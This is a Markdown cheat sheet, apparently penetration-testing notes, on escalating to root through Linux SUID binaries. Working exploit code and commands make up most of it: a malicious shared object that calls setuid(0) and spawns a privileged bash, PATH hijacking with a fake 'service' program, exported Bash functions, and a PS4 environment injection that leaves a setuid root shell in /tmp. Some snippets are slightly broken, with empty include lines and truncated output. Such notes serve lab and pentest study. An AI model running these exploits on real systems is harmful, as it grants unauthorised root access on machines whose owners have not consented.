# SUID

## Find SUID files

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

- Search on GTFOBins for exploitation: [https://gtfobins.github.io/](https://gtfobins.github.io/)
- Use searchsploit: `searchsploit suidprogram 2.3`

## Shared Object

Use strace to find the shared objects not found.

```bash
$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

In the result above, the program is trying to load a shared object from the user directory.

1 - Create the directory  /home/user/.config
2 - cd into .config directory
3 - create the shared object libcalc.so

```c
#include 
#include 

static void inject() __attribute__((constructor));
 void inject() {
	setuid(0);
	system("/bin/bash -p"); 
}
```

Compile:

```c
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

Execute the SUID file to gain root shell:

```c
/usr/local/bin/suid-so
```

## PATH Environment Variable

We create a reverse shell embedded into a program with the same name as one of the programs used by the SUID programs.

For example:

`/usr/bin/mysuidprogram` is a program that start an apache server using the string `service apache start`. We could then create a file named `service` located in our user home directory
and append the `/home/user` directory to the PATH variable.

The computer will call `/home/user/service` before `/usr/bin` and spawn a root reverse
shell.

### Finding vulnerable programs (in SUID)

```bash
# Find SUID files
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
/usr/local/bin/suid-env

Look for programs/services called inside these SUIDs
$ strings /path/to/file

$ strace -v -f -e execve 2>&1 | grep exec
[pid 14395] execve("/bin/sh", ["sh", "-c", "service apache2 start"],

$ ltrace /usr/local/bin/suid-env 2>&1 | grep service 
system("service apache2 start"

Then create a file named "service".
```

Create the exploit:

```c
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```

Compile:

```bash
gcc -o service service.c
```

Prepend the current directory to the PATH directory:

```bash
$ PATH=.:$PATH /usr/local/bin/suid-env
```

## Old Bash

Versions < 4.2-048 are vulnerable to path attack.

```bash
# Verify bash version
$ bash --version 

# Find the service called by a SUID file
$ strings /usr/local/bin/suid-env2
/usr/sbin/service apache2 start

$ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
[pid 16729] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 

Note: This time is using the absolute path.

# Exploit
Create a Bash function with the name “/usr/sbin/service” and export the function: 

$ function /usr/sbin/service { /bin/bash -p; } 
$ export –f /usr/sbin/service 

# Execute the SUID file for a root shell:
$ /usr/local/bin/suid-env2
```

Versions < 4.4 inherit the PS4 env variable.

```bash
# Find SUID/SGID files
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# Find the service called by a SUID file
$ strings /usr/local/bin/suid-env2
/usr/sbin/service apache2 start

$ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
[pid 16729] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 

# Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2

# Run the /tmp/rootbash file with the -p command line option to get a root shell:
$ /tmp/rootbash -p
```